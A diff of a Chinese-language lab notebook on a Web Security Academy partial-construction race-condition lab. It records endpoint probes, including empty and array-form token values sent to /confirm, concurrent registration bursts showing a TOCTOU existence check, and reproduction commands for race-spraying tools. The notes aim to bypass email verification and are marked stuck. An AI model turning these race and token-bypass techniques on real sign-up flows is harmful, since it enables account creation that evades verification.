@@ -7,51 +7,35 @@ title: lab-race-conditions-partial-construction
 > evidences: [[race-conditions-family]]
 
 - 题面:Partial construction race;绕邮箱验证建号 → 登录 → 删 carlos。
-- 实例(批50):https://0af3008703f359bc8471ef7100ff00f6.web-security-academy.net
-- 判定:**stuck**(可见性探针实验已跑,但**探针自身即写者 ⇒ 实验被污染**;token 值面仍是墙)
+- 实例(批51):https://0a0a00750454f6208085219700d10070.web-security-academy.net
+- 判定:**stuck**(确认腿 = `POST /confirm?token=…`;空 token 被 app 层 403 挡死 ⇒「半构造行 token 为空串」这条路在本实例不成立,读侧播撒也没找到窗口)
 
-## 本实例端点事实(批50 实测)
+## 端点事实(批51 实测,合并批50)
 
-1. **注册页两值类**:新 INSERT `2636B`(`Please check your emails for your account registration link`);
-   重复用户名 `3142B`(`An account already exists with that username`)。
-2. **校验顺序 = email → 存在性 → INSERT**:`username=probeA`(已存在)+ 非法 email → `Invalid email address`(3119B);
-   `username=probeA` + 合法 email + 1 字符密码 → **DUP(3142B)** ⇒ 密码无校验门。
-   ⇒ 找不到「过存在性检查却因其它校验被挡」的**非变异**探针。
-3. **登录被确认门挡死**:未确认账号 `POST /login`(probeA/pw) → 200 登录页(无 302,body 3801)
-   ⇒ `/login` 不可作可见性探针。
-4. **email 客户端只显示 `@exploit-<id>.exploit-server.net`**(Inbox is empty);而注册白名单要求
-   `@ginandjuice.shop` ⇒ **无 token 可读化原语**(prescript 的 ② pivot 无落点)。
+1. **注册**:`GET /register` 表单由 `users.js` 的 `createRegistrationForm()` 生成;csrf 是**会话级且可重复用**;新 INSERT 页 2636B、重复用户名页 3142B(唯一判据二值)。email 白名单**强校验**:`x@exploit-<id>.exploit-server.net` -> 3119B `Invalid email address` ⇒ 无「读自己的确认信」通路。
+2. **确认腿 = POST**:`users.js` 的 `confirmEmail()` 从 URL query 造 `POST /confirm?<query>`。`GET /confirm?token=<任意值>` 一律 200(2839B,digest fa1c51e1e8659475,不校验 token),只是渲染页。
+3. **空 token 被 app 拒绝**:`POST /confirm?token=` 与 `token=%20`、`token=+` -> **403 `"Forbidden"`**;`token=0`/`token=1` -> 400 `"Incorrect token: …"`;无 token -> 400 `"Missing parameter: token"`;`token=%00` -> 500。
+4. **`token[]=` 绕过 403** 但绑定的是 `''`:响应 400 `"Incorrect token: Array"`(`token[a]=`、`token[0]=` 同)。批50 的 500「placeholder 1 vs 2 参数」说明该端点是参数化 `WHERE token = ?` 且把数组铺开绑定。
+5. **登录**:`POST /login`(csrf 与注册同一个)未确认账号 -> 200 3801B `Invalid username or password`(无 302);缺 csrf 的对照腿因 CL 写错给 500,不作数。
+6. **存在性检查是 TOCTOU**:同一用户名 8 个并发 `POST /register` -> **4× 2636(新 INSERT)+ 4× 3142(DUP)**。
+7. **读侧播撒失败**:4 worker × 25ms × 9s 对 `POST /confirm?token[]=` 只发出 36 条(全 400),期间前台并发 4 个注册窗口 -> `hits=0`。
+8. **可见性探针纪律**(批50 立,批51 复核):`/register` 自身即写者,不能当可见性探针;`/login` 被确认门挡、`/confirm` 只泄查询形态 ⇒ 该 lab 的 HTTP 层**没有**非变异读路径(见 [[visibility-probe-must-be-non-mutating]])。
 
-## 可见性实验(按 prescript 跑)
+## 判读与下一步
 
-```
-race_spread <inst>/register --method POST --body 'csrf=…&username=racew1&email=racew1@ginandjuice.shop&password=pw12345678' \
-  --window-ms 12000 --workers 16 --class NEW:2636,DUP:3142 --hit-substr 'already exists' --extra-header 'Cookie: phpsessionid=…'
-race_send <inst>/register --form csrf=… --form username=racew1 … --n 20 --jar <jar>
-```
-
-读数:read 侧 **sent 153 / DUP 149 / NEW 4**;write 侧 20/20 **DUP**。
-
-**判读(本批关键)**:该实验**被污染** —— `/register` 探针本身就是写者:它的 INSERT 提交后,
-后续探针全看到 DUP。write 侧 20/20 DUP 正是因为 read 侧探针已把 `racew1` 建好。
-⇒ 「DUP 独有串命中」**不能**判 ②(行可见);同理「read 侧全 NEW」也几乎不可能出现。
-**纪律:可见性探针必须是非变异的**(本实例无此端面,/register 做不到)。
-
-## 仍在档的正面事实
-
-- 注册行**提交很快**:同一波并发里,后到的存在性检查已能看到前者的 INSERT(153 探针 149 DUP)。
-  ⇒ 假设①「INSERT 长事务未提交(包住慢发信)」**不像**成立;更像行早早提交,而 `token` 值不是 `''`
-  (NULL 或插入即设)⇒ 绑空串的 `token[]=` 永不可中(累计 ≈530 次零命中,跨 h1 齐发/读侧播撒/h2 单包)。
-- 未决面已收窄为「token 值/可读化」,**不是时序也不是样本量**;本 lab 无该原语 ⇒ 依纪律关闭本题轮次。
+- 「半构造行 token = 空串」与 `WHERE token = ?` 的组合**被 403 证伪**(输入侧空值直接拒绝,数组形态也绑不到 NULL)。
+- 未决面收窄为:被后置写入的列到底是哪一列(token 之外?email?confirmed 标志?),以及该列在窗口内的**可匹配形态**(NULL 不可由 query 到达 ⇒ 需要能到达 NULL 的信道或换观测原语)。
+- 复攻建议:先找「非变异、能区分半构造行」的读原语(如把该行渲染出来的页/错误码差分),再谈窗口;单靠加大 confirm 量已被两批否证。
 
 ## 复现命令
 
 ```
-http_session get <inst>/register --jar <jar> --out /tmp/reg.html            # csrf
-http_session post <inst>/register --form username=probeA --form email=probeA@ginandjuice.shop … # 2636
-http_session post <inst>/register --form username=probeA --form email=x@ginandjuice.shop …     # 3142
+http_dump <inst>/register --out reg.html        # csrf + phpsessionid(注意:http_session 偶发挂死,http_dump 稳)
+raw_matrix '{"host":"<inst>","variants":[{"name":"regexp","line":"POST /register HTTP/1.1","headers":["Cookie: phpsessionid=…","Content-Type: application/x-www-form-urlencoded","Content-Length: 95"],"body":"csrf=…&username=u1&email=u1@ginandjuice.shop&password=pw12345678"}]}'
+race_send <inst>/register --method POST --n 8 --form csrf=… --form username=rr1 --form email=rr1@ginandjuice.shop --form password=… --header 'Cookie: phpsessionid=…'
+race_spread '<inst>/confirm?token%5B%5D=' --method POST --window-ms 9000 --interval-ms 25 --workers 4
 ```
 
 ## 关系
 
-- 族:[[race-conditions-family]];方法见 [[http-2-single-packet-race-burst-method]]。
+- 族:[[race-conditions-family]];方法见 [[http-2-single-packet-race-burst-method]]、[[visibility-probe-must-be-non-mutating]]。
